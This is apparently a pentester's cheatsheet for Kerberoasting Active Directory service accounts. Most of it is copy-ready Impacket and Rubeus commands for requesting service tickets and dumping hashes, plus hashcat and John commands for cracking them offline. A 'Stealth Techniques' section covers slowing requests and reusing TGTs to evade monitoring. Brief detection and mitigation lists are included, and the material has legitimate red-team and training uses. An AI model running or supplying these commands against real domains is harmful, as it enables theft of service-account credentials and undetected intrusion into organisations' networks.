# Kerberoast Cheatsheet

## Quick Reference

### Installation

#### Impacket (Linux)
```bash
sudo apt install impacket-scripts
```

#### Rubeus (Windows)
```bash
# Download from GitHub
https://github.com/GhostPack/Rubeus
```

### Basic Commands

#### Impacket Kerberoast
```bash
impacket-GetUserSPNs domain/user:password -request -outputfile hashes.txt
```

#### Rubeus Kerberoast
```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

### Impacket Commands

#### List Service Accounts
```bash
impacket-GetUserSPNs domain/user:password
```

#### Request TGS
```bash
impacket-GetUserSPNs domain/user:password -request
```

#### Specific Domain Controller
```bash
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1 -request
```

#### Target Specific SPN
```bash
impacket-GetUserSPNs domain/user:password -request -targetuser svc_sql
```

### Rubeus Commands

#### Basic Kerberoast
```bash
Rubeus.exe kerberoast
```

#### Output to File
```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

#### Delegate TGT
```bash
Rubeus.exe kerberoast /tgtdeleg
```

#### Target User
```bash
Rubeus.exe kerberoast /user:svc_sql
```

### Cracking Kerberoast Hashes

#### With Hashcat
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

#### With John
```bash
john --format=krb5tgs hashes.txt
```

### Workflow

1. **Enumerate** SPNs
2. **Request** TGS tickets
3. **Extract** hashes
4. **Crack** offline
5. **Use** credentials

### Stealth Techniques

#### Use Existing TGT
```bash
Rubeus.exe kerberoast /tgtdeleg
```

#### Slow Requests
```bash
Rubeus.exe kerberoast /interval:30
```

### Detection Indicators

| Indicator | Event ID |
|-----------|----------|
| TGS Request | 4769 |
| Service Ticket | 4770 |
| Unusual SPN | 4769 |

### Mitigation

- Use 25+ character service passwords
- Implement gMSA
- Disable unnecessary SPNs
- Monitor TGS requests

### Troubleshooting

#### KDC_ERR_S_PRINCIPAL_UNKNOWN
```bash
# Check SPN exists
impacket-GetUserSPNs domain/user:password
```

#### Access Denied
```bash
# Verify credentials
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1
```

### Related Tools
- **Rubeus:** Kerberos toolkit
- **Impacket:** Python network toolkit
- **hashcat:** Password cracker
- **john:** John the Ripper
